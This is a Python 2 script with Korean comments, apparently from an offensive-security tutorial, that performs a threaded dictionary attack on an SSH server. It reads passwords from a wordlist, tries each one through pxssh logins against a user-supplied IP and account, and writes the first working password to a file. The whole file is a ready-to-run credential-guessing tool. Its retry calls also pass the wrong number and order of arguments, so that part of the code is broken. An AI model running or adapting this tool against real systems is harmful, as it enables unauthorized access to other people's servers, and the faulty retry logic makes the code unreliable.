#-*- coding: utf-8 -*-
import time, pxssh
from threading import *

maxConnections=5
connection_lock=BoundedSemaphore(value=maxConnections)
Fails=0

def connect(host, user, password, saveFile, release):
    global Found
    global Fails
    try:
        s=pxssh.pxssh()
        s.login(host, user, password)
        print '[+] Password Found : '+password
        fp=open(saveFile,"w")
        fp.write(password)
        fp.close()
        print "[+] Open the "+saveFile
        time.sleep(30)
        exit(0)
    except Exception, e:
        if 'read_nonblocking' in str(e): # SSH서버에서 연결의 수가 초과됐다고 했을 경우
            Fails+=1
            time.sleep(5)
            connect(host, user, password, False)
            pass
        elif 'synchronize with original prompt' in str(e): # Pxssh가 커맨드를 얻지 못했을 경우
            time.sleep(1)
            connect(host, user, password, False)
            pass
        elif 'password refused' in str(e): # 패스워드가 아닐 경우
            pass
        else:
            print "[-]", e
            time.sleep(30)
            exit(0)
    finally:
        if release: 
            connection_lock.release()

def main():
    try:
        host=raw_input("Input SSH Server IP : ")
        user=raw_input("Input SSH Account : ")
        dictionary=raw_input("Input Dictionary File : ")
        saveFile=raw_input("Input Save File : ")
        fp=open(dictionary, "r")
        for line in fp.readlines():
            if(Fails>5):
                print "[-] Exiting : Too Many Socket Timeouts"
                time.sleep(30)
                exit(0)
            connection_lock.acquire()
            password=line.strip('\r').strip('\n')
            print "Test Password : "+str(password)
            # connect 함수가 귀납적으로 다른 connect 함수를 호출할 수 있기 때문에 호출함수만이 connect_lock 세마포어를 해제할 수 있도록 불리언값인 release 변수를 마지막 파라미터로 포함했다.
            t=Thread(target=connect, args=(host, user, password, saveFile, True))
            child=t.start()
    except Exception, e:
        print "[-]", e
        time.sleep(30)
        exit(0)

if __name__ == '__main__':
    main()